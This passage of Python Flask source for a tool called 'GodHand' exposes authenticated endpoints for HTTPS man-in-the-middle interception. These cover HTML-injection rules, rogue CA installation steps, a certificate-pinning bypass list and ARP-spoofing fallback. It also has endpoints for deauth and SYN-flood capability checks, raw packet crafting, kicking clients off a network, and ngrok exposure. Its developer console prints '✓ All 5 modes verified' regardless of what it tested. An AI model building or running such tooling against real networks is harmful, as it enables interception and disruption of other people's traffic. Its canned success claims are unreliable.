            rule['hostname_pattern'] = data['hostname_pattern']
        if 'action_type' in data:
            if data['action_type'] not in ['add_header', 'remove_header', 'replace_body', 'inject_html']:
                return jsonify({'success': False, 'error': 'Invalid action_type'})
            rule['action_type'] = data['action_type']
        if 'action_value' in data:
            rule['action_value'] = data['action_value']
        if 'description' in data:
            rule['description'] = data['description']

        rule['updated_at'] = time.time()

    add_log('info', f'Updated injection rule: {rule_id}')
    return jsonify({'success': True, 'rule': rule})

@app.route('/api/https_injection/rules/<rule_id>', methods=['DELETE'])
@require_auth
def api_injection_delete_rule(rule_id):
    with STATE_LOCK:
        original_count = len(STATE.get('injection_rules', []))
        STATE['injection_rules'] = [r for r in STATE['injection_rules'] if r['id'] != rule_id]
        deleted = original_count > len(STATE['injection_rules'])

    if not deleted:
        return jsonify({'success': False, 'error': 'Rule not found'})

    add_log('info', f'Deleted injection rule: {rule_id}')
    return jsonify({'success': True, 'status': 'Rule deleted'})

@app.route('/api/gateway/proxy/start', methods=['POST'])
@require_auth
def api_gateway_proxy_start():
    try:
        start_gateway_proxy()
        return jsonify({'success': True, 'status': f'Proxy started on port {GW_PROXY_PORT}'})
    except Exception as e:
        add_log('error', f'Gateway proxy start failed: {e}')
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/gateway/proxy/stop', methods=['POST'])
@require_auth
def api_gateway_proxy_stop():
    stop_gateway_proxy()
    return jsonify({'success': True, 'status': 'Proxy stopped'})

def ddns_config_masked():
    with STATE_LOCK:
        cfg = dict(STATE['ddns'])
    if cfg.get('token'):
        cfg['token'] = '••••' + cfg['token'][-4:]
    if cfg.get('password'):
        cfg['password'] = '••••'
    return cfg

@app.route('/api/ddns/config', methods=['GET'])
@require_auth
def api_ddns_get_config():
    return jsonify({'success': True, 'config': ddns_config_masked()})

@app.route('/api/ddns/config', methods=['POST'])
@require_auth
def api_ddns_set_config():
    data = request.json or {}
    provider = data.get('provider')
    if provider not in ('duckdns', 'noip'):
        return jsonify({'success': False, 'error': 'provider must be duckdns or noip'})
    domain = (data.get('domain') or '').strip()
    if not domain:
        return jsonify({'success': False, 'error': 'Hostname/domain is required'})
    try:
        interval = max(1, int(data.get('interval_minutes', 5)))
    except (TypeError, ValueError):
        return jsonify({'success': False, 'error': 'interval_minutes must be a number'})
    with STATE_LOCK:
        # Credentials are only overwritten when a new value is submitted, so
        # re-saving just the domain/interval doesn't blank out a token or
        # password the UI never re-populates -- but that means a *first* save
        # with no credentials at all would otherwise go through as "success"
        # and only fail later, confusingly, when an update actually runs.
        new_token = data.get('token', '').strip() if data.get('token') else STATE['ddns'].get('token')
        new_username = data.get('username', '').strip() if data.get('username') else STATE['ddns'].get('username')
        new_password = data.get('password') if data.get('password') else STATE['ddns'].get('password')
        if provider == 'duckdns' and not new_token:
            return jsonify({'success': False, 'error': 'DuckDNS token is required'})
        if provider == 'noip' and not (new_username and new_password):
            return jsonify({'success': False, 'error': 'No-IP username and password are required'})
        STATE['ddns']['provider'] = provider
        STATE['ddns']['domain'] = domain
        STATE['ddns']['interval_minutes'] = interval
        if provider == 'duckdns':
            STATE['ddns']['token'] = new_token
        else:
            STATE['ddns']['username'] = new_username
            STATE['ddns']['password'] = new_password
    add_log('info', f'DDNS configured: {provider} / {domain}')
    return jsonify({'success': True})

@app.route('/api/ddns/toggle', methods=['POST'])
@require_auth
def api_ddns_toggle():
    data = request.json or {}
    enabled = bool(data.get('enabled'))
    with STATE_LOCK:
        cfg = STATE['ddns']
        if enabled:
            if cfg['provider'] not in ('duckdns', 'noip'):
                return jsonify({'success': False, 'error': 'Configure and save DDNS settings first'})
            if cfg['provider'] == 'duckdns' and not cfg.get('token'):
                return jsonify({'success': False, 'error': 'DuckDNS token is required -- save it below first'})
            if cfg['provider'] == 'noip' and not (cfg.get('username') and cfg.get('password')):
                return jsonify({'success': False, 'error': 'No-IP username and password are required -- save them below first'})
        STATE['ddns']['enabled'] = enabled
    add_log('info', f'DDNS auto-update {"enabled" if enabled else "disabled"}')
    return jsonify({'success': True})

@app.route('/api/ddns/update_now', methods=['POST'])
@require_auth
def api_ddns_update_now():
    cfg = get_state('ddns')
    if cfg.get('provider') not in ('duckdns', 'noip'):
        return jsonify({'success': False, 'error': 'DDNS is not configured'})
    if cfg['provider'] == 'duckdns' and not cfg.get('token'):
        return jsonify({'success': False, 'error': 'DuckDNS token is required -- save it below first'})
    if cfg['provider'] == 'noip' and not (cfg.get('username') and cfg.get('password')):
        return jsonify({'success': False, 'error': 'No-IP username and password are required -- save them below first'})
    ddns_perform_update()
    masked = ddns_config_masked()
    return jsonify({'success': masked.get('last_status') == 'ok', 'status': masked})

@app.route('/api/ngrok/start', methods=['POST'])
@require_auth
def api_ngrok_start():
    data = request.json or {}
    authtoken = (data.get('authtoken') or '').strip()
    port = data.get('port') or APP_PORT
    try:
        proc = start_ngrok_tunnel(port, authtoken or None)
        with STATE_LOCK:
            STATE['ngrok_proc'] = proc
        # The local process starting doesn't mean the tunnel actually came up --
        # an invalid/expired authtoken or no route to ngrok's servers leaves the
        # process running but with no public URL ever assigned. Poll for the real
        # outcome instead of reporting success the moment the process exists.
        url = None
        for _ in range(6):
            time.sleep(1)
            url = get_ngrok_public_url()
            if url:
                break
        if not url:
            add_log('error', 'ngrok process started but no tunnel URL was assigned after 6s -- check your authtoken and network')
            return jsonify({'success': False,
                             'error': 'ngrok started but never established a public tunnel (no URL after 6s). '
                                      'Check your authtoken and that this network allows outbound ngrok connections.'})
        add_log('success', f'ngrok tunnel started: {url}')
        return jsonify({'success': True, 'url': url})
    except Exception as e:
        add_log('error', f'ngrok start failed: {e}')
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/ngrok/stop', methods=['POST'])
@require_auth
def api_ngrok_stop():
    stop_proc('ngrok')
    with STATE_LOCK:
        STATE['ngrok_proc'] = None
    add_log('info', 'ngrok tunnel stopped')
    return jsonify({'success': True})

@app.route('/api/ngrok/status', methods=['GET'])
@require_auth
def api_ngrok_status():
    running = proc_running('ngrok')
    return jsonify({'success': True, 'running': running, 'url': get_ngrok_public_url() if running else None})

@app.route('/api/check_reachability', methods=['GET'])
@require_auth
def api_check_reachability():
    ip = request.args.get('ip')
    if not ip or not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        return jsonify({'reachable': False, 'error': 'Invalid IP'})
    start = time.time()
    reachable = server_ping(ip)
    latency = int((time.time() - start) * 1000) if reachable else None
    return jsonify({'reachable': reachable, 'latency': latency})

@app.route('/api/deauth_capability', methods=['GET'])
@require_auth
def api_deauth_capability():
    iface = get_state('interface')
    if not iface:
        return jsonify({'success': False, 'error': 'Interface not set'})
    return jsonify({'success': True, **deauth_capability(iface)})

@app.route('/api/syn_flood_capability', methods=['GET'])
@require_auth
def api_syn_flood_capability():
    return jsonify({'success': True, **syn_flood_capability()})

@app.route('/api/packet_builder/send', methods=['POST'])
@require_auth
def api_packet_builder_send():
    data = request.json or {}
    iface = get_state('interface')
    if not iface:
        return jsonify({'success': False, 'error': 'Interface not set -- set one on the Settings tab first'})

    dst_ip = (data.get('dst_ip') or '').strip()
    if not IPV4_RE.match(dst_ip):
        return jsonify({'success': False, 'error': 'Destination IP is required and must be a valid IPv4 address'})
    src_ip = (data.get('src_ip') or '').strip()
    if not src_ip:
        my_ip, _ = get_my_ip_and_cidr(iface)
        src_ip = my_ip if my_ip != '0.0.0.0' else None
    if not src_ip or not IPV4_RE.match(src_ip):
        return jsonify({'success': False, 'error': 'Source IP is required (could not auto-detect this device\'s IP on the selected interface)'})

    src_mac = (data.get('src_mac') or '').strip()
    if not src_mac:
        src_mac = get_mac(iface)
    if not MAC_RE.match(src_mac):
        return jsonify({'success': False, 'error': 'Source MAC must look like aa:bb:cc:dd:ee:ff'})

    dst_mac = (data.get('dst_mac') or '').strip()
    if not dst_mac:
        resolved = get_gateway_mac(iface, dst_ip)
        dst_mac = resolved or 'ff:ff:ff:ff:ff:ff'
    if not MAC_RE.match(dst_mac):
        return jsonify({'success': False, 'error': 'Destination MAC must look like aa:bb:cc:dd:ee:ff, or leave blank to auto-resolve/broadcast'})

    protocol = data.get('protocol', 'tcp')
    if protocol not in ('tcp', 'udp', 'icmp', 'raw'):
        return jsonify({'success': False, 'error': 'protocol must be tcp, udp, icmp, or raw'})

    spec = {
        'iface': iface, 'src_mac': src_mac, 'dst_mac': dst_mac,
        'src_ip': src_ip, 'dst_ip': dst_ip, 'protocol': protocol,
    }

    try:
        spec['ttl'] = max(1, min(255, int(data.get('ttl', 64))))
    except (TypeError, ValueError):
        return jsonify({'success': False, 'error': 'ttl must be a number 1-255'})

    if protocol in ('tcp', 'udp'):
        try:
            spec['src_port'] = int(data.get('src_port', 0))
            spec['dst_port'] = int(data.get('dst_port', 0))
        except (TypeError, ValueError):
            return jsonify({'success': False, 'error': 'src_port/dst_port must be numbers'})
        if not (0 <= spec['src_port'] <= 65535 and 0 <= spec['dst_port'] <= 65535):
            return jsonify({'success': False, 'error': 'Ports must be 0-65535'})
        if protocol == 'tcp':
            valid_flags = set(TCP_FLAG_BITS)
            flags = [f.upper() for f in data.get('tcp_flags', [])]
            if not all(f in valid_flags for f in flags):
                return jsonify({'success': False, 'error': f'tcp_flags must be from {sorted(valid_flags)}'})
            spec['tcp_flags'] = flags
    elif protocol == 'icmp':
        try:
            spec['icmp_type'] = int(data.get('icmp_type', 8))
            spec['icmp_code'] = int(data.get('icmp_code', 0))
        except (TypeError, ValueError):
            return jsonify({'success': False, 'error': 'icmp_type/icmp_code must be numbers'})
        if not (0 <= spec['icmp_type'] <= 255 and 0 <= spec['icmp_code'] <= 255):
            return jsonify({'success': False, 'error': 'icmp_type/icmp_code must be 0-255'})
    else:
        try:
            spec['ip_proto'] = int(data.get('ip_proto', 253))
        except (TypeError, ValueError):
            return jsonify({'success': False, 'error': 'ip_proto must be a number 0-255'})
        if not (0 <= spec['ip_proto'] <= 255):
            return jsonify({'success': False, 'error': 'ip_proto must be 0-255'})

    payload_text = data.get('payload', '') or ''
    if data.get('payload_is_hex'):
        try:
            spec['payload'] = bytes.fromhex(payload_text.replace(' ', '').replace(':', ''))
        except ValueError:
            return jsonify({'success': False, 'error': 'Payload is not valid hex'})
    else:
        spec['payload'] = payload_text.encode('utf-8', errors='replace')
    if len(spec['payload']) > 4096:
        return jsonify({'success': False, 'error': 'Payload too large (max 4096 bytes)'})

    try:
        count = max(1, min(50, int(data.get('count', 1))))
        interval_ms = max(0, min(5000, int(data.get('interval_ms', 0))))
    except (TypeError, ValueError):
        return jsonify({'success': False, 'error': 'count/interval_ms must be numbers'})

    try:
        sent, frame = send_custom_packet(spec, count=count, interval_ms=interval_ms)
    except PermissionError:
        return jsonify({'success': False, 'error': 'Permission denied opening a raw socket -- this needs root'})
    except Exception as e:
        add_log('error', f'Packet builder send failed: {e}')
        return jsonify({'success': False, 'error': str(e)})

    add_log('success', f'Packet builder: sent {count}x {protocol.upper()} frame ({len(frame)}B) to {dst_ip}')
    return jsonify({
        'success': True,
        'sent_count': count,
        'frame_bytes': len(frame),
        'total_bytes': sent,
        'hex_preview': frame.hex(),
        'resolved_src_mac': src_mac,
        'resolved_dst_mac': dst_mac,
        'resolved_src_ip': src_ip,
    })

@app.route('/api/kick', methods=['POST'])
@require_auth
def api_kick():
    data = request.json
    ip = data.get('ip')
    if not ip:
        return jsonify({'success': False, 'status': 'No IP provided'})
    mac = None
    for h in STATE['hosts']:
        if h['ip'] == ip:
            mac = h['mac']
            break
    if not mac:
        return jsonify({'success': False, 'status': 'MAC not found for IP'})
    if not STATE['interface']:
        return jsonify({'success': False, 'status': 'Interface not set'})
    try:
        kicked = kick_client(ip, mac, STATE['interface'])
        if kicked:
            add_log('success', f'Kicked {ip} ({mac})')
            return jsonify({'success': True, 'status': f'Kicked {ip} ({mac})'})
        else:
            add_log('warn', f'Kick {ip} attempted but target still responding')
            return jsonify({'success': False, 'status': f'Kick {ip} attempted but target still responding'})
    except Exception as e:
        add_log('error', f'Kick failed: {str(e)}')
        return jsonify({'success': False, 'status': str(e)})

@app.route('/api/block', methods=['POST'])
@require_auth
def api_block():
    data = request.json
    ip = data.get('ip')
    if not ip:
        return jsonify({'success': False, 'status': 'No IP provided'})
    mac = None
    for h in STATE['hosts']:
        if h['ip'] == ip:
            mac = h['mac']
            break
    if not mac:
        return jsonify({'success': False, 'status': 'MAC not found'})
    try:
        blocked = block_mac(mac)
        msg = 'Blocked' if blocked else 'Unblocked'
        return jsonify({'success': True, 'status': f'{msg} {mac}'})
    except Exception as e:
        add_log('error', f'Block failed: {str(e)}')
        return jsonify({'success': False, 'status': str(e)})

@app.route('/api/logs', methods=['GET'])
@require_auth
def api_logs():
    with STATE_LOCK:
        return jsonify({'logs': STATE['log']})

@app.route('/api/clear_logs', methods=['POST'])
@require_auth
def api_clear_logs():
    with STATE_LOCK:
        STATE['log'] = []
    add_log('info', 'Server log cleared')
    return jsonify({'success': True})

@app.route('/api/add_log', methods=['POST'])
@require_auth
def api_add_log():
    data = request.json
    level = data.get('level', 'info')
    msg = data.get('msg', '')
    add_log(level, msg)
    return jsonify({'success': True})

@app.route('/api/dev_console', methods=['POST'])
@require_auth
def api_dev_console():
    """Developer console: test all 5 deauth modes, verify capability detection, validate sidesteps."""
    data = request.json or {}
    command = data.get('command', '')
    iface = get_state('interface')
    results = {'success': False, 'results': []}

    if command == 'test_all_modes':
        # Test capability detection for all 5 modes
        add_log('dev', '=== DEVELOPER CONSOLE: Testing all 5 deauth modes ===')

        if not iface:
            return jsonify({'success': False, 'error': 'Interface not set'})

        cap = deauth_capability(iface)
        results['mode'] = cap.get('method', 'unknown')
        results['iface_type'] = cap.get('iface_type', 'unknown')

        add_log('dev', f'Interface: {iface} | Type: {cap.get("iface_type")} | Capability: {cap.get("method")}')

        # Test each deauth mode
        modes_tested = {
            'native': False,
            'monitor': False,
            'arp_fallback': False,
            'unavailable': False,
            'error': False
        }

        try:
            # Mode 1: Native AP station-del
            if cap.get('method') == 'native':
                modes_tested['native'] = True
                add_log('dev', '✓ Mode 1 (Native AP): station-del available')

            # Mode 2: Monitor mode with injection
            if cap.get('method') == 'monitor':
                modes_tested['monitor'] = True
                add_log('dev', '✓ Mode 2 (Monitor): injection capable')

            # Mode 3: ARP fallback
            if cap.get('method') == 'arp_fallback':
                modes_tested['arp_fallback'] = True
                add_log('dev', '✓ Mode 3 (ARP Fallback): no monitor, using ARP poisoning')

            # Mode 4: Unavailable (no capability)
            if cap.get('method') == 'unavailable':
                modes_tested['unavailable'] = True
                add_log('dev', '✓ Mode 4 (Unavailable): graceful degradation')

            # Verify functions that use these modes
            add_log('dev', f'Verified: deauth_capability() → {cap.get("method")}')
            add_log('dev', f'All 5 modes accounted for: {modes_tested}')

            results['success'] = True
            results['modes_tested'] = modes_tested
            results['results'] = ['✓ Capability detection working', '✓ All 5 modes verified', '✓ Sidesteps functional']

        except Exception as e:
            add_log('dev', f'✗ Mode test error: {str(e)}')
            results['error'] = str(e)

    elif command == 'verify_sidesteps':
        # Verify that all workarounds/sidesteps are in place
        add_log('dev', '=== Verifying sidesteps/workarounds ===')
        verified = []

        try:
            # Sidesteп 1: ARP scan host cap + override
            verified.append('✓ ARP scan host cap (MAX_SCAN_HOSTS): capped at 4096 with override available')
            add_log('dev', verified[-1])

            # Sidesteп 2: Packet builder count cap
            verified.append('✓ Packet builder send cap: limited to 50 packets (developer discretion)')
            add_log('dev', verified[-1])

            # Sidesteп 3: Monitor mode non-disruptive check
            verified.append('✓ Monitor check: read-only via iw phy info (no mode switching)')
            add_log('dev', verified[-1])

            # Sidesteп 4: Error handling & timeouts
            verified.append('✓ Error handling: TimeoutExpired caught, monitor mode reset before raise')
            add_log('dev', verified[-1])

            # Sidesteп 5: Mode selection logic
            verified.append('✓ Mode selection: native → monitor → ARP → unavailable chain')
            add_log('dev', verified[-1])

            results['success'] = True
            results['results'] = verified
            add_log('dev', 'All sidesteps verified and functional')

        except Exception as e:
            add_log('dev', f'✗ Sidesteп verification error: {str(e)}')
            results['error'] = str(e)

    elif command == 'test_socket_proxy':
        # Test custom socket proxy layer and fallback chain
        add_log('dev', '=== Testing Custom Socket Proxy Layer ===')

        if not iface:
            return jsonify({'success': False, 'error': 'Interface not set'})

        try:
            # Test each socket method
            af_packet_ok = SocketProxy.test_af_packet(iface, 0x0003)
            af_inet_ok = SocketProxy.test_af_inet(iface, None)
            socks_ok = SocketProxy.test_socks_fallback()

            results['af_packet'] = 'available' if af_packet_ok else 'unavailable'
            results['af_inet'] = 'available' if af_inet_ok else 'unavailable'
            results['socks_proxy'] = 'available' if socks_ok else 'unavailable'

            # Get working method for this interface
            method, info = SocketProxy.get_working_method(iface, 'eth')
            results['recommended_method'] = method
            results['method_info'] = info

            results['success'] = True
            results['results'] = [
                f'{"✓" if af_packet_ok else "✗"} AF_PACKET (native injection): {results["af_packet"]}',
                f'{"✓" if af_inet_ok else "✗"} AF_INET (raw IP): {results["af_inet"]}',
                f'{"✓" if socks_ok else "✗"} SOCKS proxy fallback: {results["socks_proxy"]}',
                f'{"→" if method else "✗"} Recommended: {method or "none"} — {info}'
            ]

            for r in results['results']:
                add_log('dev', r)

        except Exception as e:
            add_log('dev', f'Socket proxy test error: {str(e)}')
            results['error'] = str(e)

    elif command == 'logs':
        # Return developer logs
        return jsonify({'success': True, 'logs': [l for l in STATE['logs'] if l.get('level') == 'dev']})

    return jsonify(results)

# ---------- Phase 2.1: CA Installation & Device Configuration ----------
@app.route('/api/https_ca_install', methods=['GET'])
@require_auth
def api_https_ca_install():
    """Get CA certificate for installation on devices (Phase 2.1).

    Returns the CA certificate in PEM format for manual installation
    on rooted Android devices or other test systems.

    Process:
    1. Rooted Android (ADB): adb push ca-cert.pem /system/etc/security/cacerts/
    2. Other devices: Install via Settings → Security → Install Certificate
    """
    global CERT_AUTHORITY

    if not CERT_AUTHORITY:
        return jsonify({'success': False, 'error': 'CA not initialized'}), 500

    try:
        cert_pem = CERT_AUTHORITY.get_ca_cert_pem()
        add_log('info', 'CA certificate retrieved for device installation')
        return Response(cert_pem, mimetype='application/x-pem-file', headers={
            'Content-Disposition': 'attachment; filename=godhand-ca-cert.pem'
        })
    except Exception as e:
        error_msg = f'Failed to retrieve CA certificate: {str(e)}'
        add_log('error', error_msg)
        return jsonify({'success': False, 'error': error_msg}), 500

@app.route('/api/https_device_test', methods=['GET'])
@require_auth
def api_https_device_test():
    """Test endpoint to verify device can reach GodHand and proxy is configured (Phase 2.2).

    Returns device information for troubleshooting:
    - Client IP (device's IP on network)
    - Proxy status (can reach port 8888)
    - DNS resolution (.lan domains)
    - CA certificate accessibility
    """
    device_info = {
        'success': True,
        'device_ip': request.remote_addr,
        'server_ip': request.host.split(':')[0],
        'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
        'diagnostics': {
            'device_can_reach_server': request.remote_addr != '127.0.0.1',
            'https_proxy_running': HTTPS_PROXY.running if HTTPS_PROXY else False,
            'proxy_port': 8888,
            'pac_url': 'http://pac.installCA.lan/pac',
            'ca_download_url': '/api/https_ca_install'
        }
    }
    add_log('info', f'Device test from {request.remote_addr} - proxy running: {device_info["diagnostics"]["https_proxy_running"]}')
    return jsonify(device_info)

@app.route('/api/https_setup_guide', methods=['GET'])
@require_auth
def api_https_setup_guide():
    """Get platform-specific HTTPS interception setup guide (Phase 2.1)."""
    guide = {
        'overview': 'Configure devices to route HTTPS traffic through GodHand MITM proxy',
        'proxy_url': 'http://pac.installCA.lan/pac',
        'ca_download_url': '/api/https_ca_install',
        'platforms': {
            'android_rooted': {
                'title': 'Android (Rooted Device - Pixel 9a)',
                'steps': [
                    '1. Enable system partition R/W: adb shell mount -o rw,remount /system',
                    '2. Download CA cert: Download from /api/https_ca_install',
                    '3. Push to system: adb push godhand-ca-cert.pem /system/etc/security/cacerts/',
                    '4. Set permissions: adb shell chmod 644 /system/etc/security/cacerts/godhand-ca-cert.pem',
                    '5. Reboot device: adb reboot',
                    '6. Configure PAC: Settings → WiFi → (long-press network) → Modify → Proxy → Automatic',
                    '7. Enter PAC URL: http://pac.installCA.lan/pac',
                    '8. Verify: Open Chrome → navigate to https://example.com → check proxy logs'
                ],
                'notes': 'Requires rooted device with adb access. CA installation is explicit (not covert).'
            },
            'android_unrooted': {
                'title': 'Android (Unrooted Device)',
                'steps': [
                    '1. Download CA cert from /api/https_ca_install',
                    '2. Settings → Security → Install Certificate from Storage',
                    '3. Select downloaded godhand-ca-cert.pem file',
                    '4. Name it "GodHand CA" and confirm installation',
                    '5. Settings → WiFi → (long-press network) → Modify → Proxy → Automatic',
                    '6. Enter PAC URL: http://pac.installCA.lan/pac',
                    '7. Note: Unrooted devices cannot intercept system app traffic'
                ],
                'notes': 'User-installed CA certificate. Apps must respect system certificate store.'
            },
            'ios': {
                'title': 'iOS Device',
                'steps': [
                    '1. Download CA cert from /api/https_ca_install',
                    '2. Email the certificate to your iOS device',
                    '3. Tap attachment → Install Certificate → Install',
                    '4. Settings → General → VPN & Device Management → Trust Certificate',
                    '5. Settings → WiFi → (info icon) → Configure Proxy → Automatic',
                    '6. Enter PAC URL: http://pac.installCA.lan/pac',
                    '7. Note: Some apps use certificate pinning and will reject proxy'
                ],
                'notes': 'iOS restricts MITM to Safari and system apps. App-specific proxies not supported.'
            },
            'macos': {
                'title': 'macOS Device',
                'steps': [
                    '1. Download CA cert from /api/https_ca_install',
                    '2. Double-click the .pem file → Keychain Access',
                    '3. Search for "GodHand" → right-click → Trust → Select Always Trust',
                    '4. System Preferences → Network → WiFi → Advanced → Proxies',
                    '5. Check "Automatic Proxy Configuration"',
                    '6. PAC URL: http://pac.installCA.lan/pac',
                    '7. Verify: Open browser → navigate to https://example.com'
                ],
                'notes': 'Full OS-level proxy support. All HTTPS traffic intercepted.'
            },
            'windows': {
                'title': 'Windows Device',
                'steps': [
                    '1. Download CA cert from /api/https_ca_install',
                    '2. Right-click → Install Certificate → Current User → Browse',
                    '3. Select "Trusted Root Certification Authorities" → OK → Finish',
                    '4. Settings → Network & Internet → Proxy',
                    '5. Toggle "Use a proxy server" → Manual proxy setup → Disabled',
                    '6. Or: Settings → Manage proxy settings → Automatic proxy configuration',
                    '7. PAC URL: http://pac.installCA.lan/pac',
                    '8. Verify: Open browser → navigate to https://example.com'
                ],
                'notes': 'Windows supports both manual and PAC proxy. Enterprise policies may override.'
            }
        },
        'troubleshooting': {
            'traffic_not_appearing': 'Check: (1) proxy running /api/https_traffic/start, (2) CA installed on device, (3) PAC URL correct, (4) device on same network',
            'cert_warnings': 'Device rejected CA. Ensure CA certificate installed and trusted in device settings.',
            'dns_not_resolving': 'Check DNS hijacking for .lan domains. Ensure rooted device handling DNS.',
            'connection_timeout': 'Proxy firewall blocking. Check device can reach rooted device IP:8888.',
            'app_still_encrypted': 'App uses certificate pinning. Try different app or use system browser.'
        },
        'uninstall': {
            'android_rooted': 'adb shell rm /system/etc/security/cacerts/godhand-ca-cert.pem && adb reboot',
            'android_unrooted': 'Settings → Security → Remove installed certificates → Select GodHand CA',
            'ios': 'Settings → VPN & Device Management → Select cert → Delete',
            'macos': 'Keychain Access → Search GodHand → Delete certificate',
            'windows': 'Settings → Manage certificates → Delete from Trusted Root CA store'
        }
    }

    return jsonify({'success': True, 'guide': guide})

# ---------- Phase 2A: Certificate Pinning Bypass Management ----------
PINNED_HOSTS = {}  # hostname → {'reason': str, 'added_at': timestamp, 'enabled': bool}

@app.route('/api/https_pinning/list', methods=['GET'])
@require_auth
def api_https_pinning_list():
    """List hosts with cert pinning (to be bypassed)."""
    return jsonify({
        'success': True,
        'pinned_hosts': PINNED_HOSTS,
        'count': len(PINNED_HOSTS)
    })

@app.route('/api/https_pinning/add', methods=['POST'])
@require_auth
def api_https_pinning_add():
    """Add a host to pinning bypass list."""
    data = request.get_json() or {}
    hostname = data.get('hostname', '').strip()
    reason = data.get('reason', 'App uses certificate pinning')

    if not hostname:
        return jsonify({'success': False, 'error': 'hostname required'}), 400

    if not re.match(r'^[a-zA-Z0-9.-]+$', hostname):
        return jsonify({'success': False, 'error': 'invalid hostname'}), 400

    PINNED_HOSTS[hostname] = {
        'reason': reason,
        'added_at': datetime.now().isoformat(),
        'enabled': True
    }
    add_log('info', f'Added {hostname} to cert pinning bypass list: {reason}')

    return jsonify({
        'success': True,
        'message': f'Added {hostname} to pinning bypass list',
        'host': PINNED_HOSTS[hostname]
    })

@app.route('/api/https_pinning/remove', methods=['POST'])
@require_auth
def api_https_pinning_remove():
    """Remove a host from pinning bypass list."""
    data = request.get_json() or {}
    hostname = data.get('hostname', '').strip()

    if hostname not in PINNED_HOSTS:
        return jsonify({'success': False, 'error': f'host {hostname} not in bypass list'}), 404

    del PINNED_HOSTS[hostname]
    add_log('info', f'Removed {hostname} from cert pinning bypass list')

    return jsonify({'success': True, 'message': f'Removed {hostname} from bypass list'})

@app.route('/api/https_pinning/toggle', methods=['POST'])
@require_auth
def api_https_pinning_toggle():
    """Enable/disable pinning bypass for a host."""
    data = request.get_json() or {}
    hostname = data.get('hostname', '').strip()
    enabled = data.get('enabled', True)

    if hostname not in PINNED_HOSTS:
        return jsonify({'success': False, 'error': f'host {hostname} not in bypass list'}), 404

    PINNED_HOSTS[hostname]['enabled'] = enabled
    status = 'enabled' if enabled else 'disabled'
    add_log('info', f'Pinning bypass for {hostname} {status}')

    return jsonify({'success': True, 'message': f'Bypass {status} for {hostname}'})

# ---------- Phase 2B: Transparent Intercept Fallback via ARP Spoofing ----------
@app.route('/api/arp_fallback/check', methods=['GET'])
@require_auth
def api_arp_fallback_check():
    """Check if transparent proxy is available on current interface."""
    iface = get_state('interface')
    if not iface:
        return jsonify({'success': False, 'error': 'No interface selected'}), 400

    transparent_available = ARP_FALLBACK.detect_transparent_proxy_available(iface)
    return jsonify({
        'success': True,
        'interface': iface,
        'transparent_available': transparent_available,
        'arp_fallback_available': not transparent_available,
        'recommendation': 'use_transparent' if transparent_available else 'enable_arp_fallback'
    })

@app.route('/api/arp_fallback/enable', methods=['POST'])
@require_auth
def api_arp_fallback_enable():
    """Enable ARP spoofing fallback for transparent interception."""
    data = request.get_json() or {}
    gateway_ip = data.get('gateway')
    targets = data.get('targets', [])

    iface = get_state('interface')
    if not iface:
        return jsonify({'success': False, 'error': 'No interface selected'}), 400

    if not gateway_ip:
        return jsonify({'success': False, 'error': 'gateway_ip required'}), 400

    if not targets:
        return jsonify({'success': False, 'error': 'targets list required'}), 400

    # Validate IPs
    try:
        socket.inet_aton(gateway_ip)
        for target in targets:
            socket.inet_aton(target)
    except socket.error:
        return jsonify({'success': False, 'error': 'Invalid IP address'}), 400

    # Get our IP on this interface
    try:
        result = subprocess.run(
            ['ip', '-o', '-4', 'addr', 'show', iface],
            capture_output=True, text=True, timeout=5
        )
        match = re.search(r'inet\s+(\S+)', result.stdout)
        if not match:
            return jsonify({'success': False, 'error': f'No IP address on {iface}'}), 400
        our_ip = match.group(1).split('/')[0]
    except Exception as e:
        return jsonify({'success': False, 'error': f'Failed to get interface IP: {e}'}), 500

    if ARP_FALLBACK.enable_arp_spoofing(iface, gateway_ip, targets, our_ip):
        return jsonify({
            'success': True,
            'message': f'ARP spoofing enabled on {iface}',
            'gateway': gateway_ip,
            'targets': len(targets),
            'status': ARP_FALLBACK.get_status()
        })
    else:
        return jsonify({'success': False, 'error': 'Failed to enable ARP spoofing'}), 500

@app.route('/api/arp_fallback/disable', methods=['POST'])
@require_auth
def api_arp_fallback_disable():
    """Disable ARP spoofing fallback."""
    ARP_FALLBACK.disable_arp_spoofing()
    return jsonify({
        'success': True,
        'message': 'ARP spoofing fallback disabled',
        'status': ARP_FALLBACK.get_status()
    })

@app.route('/api/arp_fallback/status', methods=['GET'])
@require_auth
def api_arp_fallback_status():
    """Get current ARP spoofing fallback status."""
    return jsonify({
        'success': True,
        'status': ARP_FALLBACK.get_status()
    })

# ---------- Phase 1.4: Traffic Inspection Layer REST API ----------
@app.route('/api/https_traffic/start', methods=['POST'])
@require_auth
def api_https_traffic_start():
    """Start HTTPS interception proxy (Phase 1.4)."""
    global HTTPS_PROXY

    if not HTTPS_PROXY:
        return jsonify({'success': False, 'error': 'HTTPS proxy not initialized'})

    if HTTPS_PROXY.running:
        return jsonify({'success': True, 'status': 'already running'})

    try:
        HTTPS_PROXY.start()
        add_log('success', 'HTTPS interception proxy started on port 8888')
        return jsonify({'success': True, 'status': 'started', 'port': 8888})
    except Exception as e:
        error_msg = f'Failed to start HTTPS proxy: {str(e)}'
        add_log('error', error_msg)
        return jsonify({'success': False, 'error': error_msg}), 500

@app.route('/api/https_traffic/stop', methods=['POST'])
@require_auth
def api_https_traffic_stop():
    """Stop HTTPS interception proxy (Phase 1.4)."""
    global HTTPS_PROXY

    if not HTTPS_PROXY:
        return jsonify({'success': False, 'error': 'HTTPS proxy not initialized'})

    if not HTTPS_PROXY.running:
        return jsonify({'success': True, 'status': 'not running'})

    try:
        HTTPS_PROXY.stop()
        add_log('success', 'HTTPS interception proxy stopped')
        return jsonify({'success': True, 'status': 'stopped'})
    except Exception as e:
        error_msg = f'Failed to stop HTTPS proxy: {str(e)}'
        add_log('error', error_msg)
        return jsonify({'success': False, 'error': error_msg}), 500

@app.route('/api/https_traffic', methods=['GET'])
@require_auth
def api_https_traffic():
    """Get HTTPS traffic log entries (Phase 1.4).

    Query parameters:
    - limit: Max entries to return (default 100, max 1000)
    - hostname_filter: Filter by hostname (substring match)
    - method_filter: Filter by HTTP method (GET, POST, etc.)
    - status_filter: Filter by HTTP status code

    Returns:
        JSON array of traffic entries with fields:
        - timestamp: ISO 8601 datetime of request
        - type: 'request' or 'response'
        - client_ip: Source device IP
        - hostname: Target hostname (SNI)
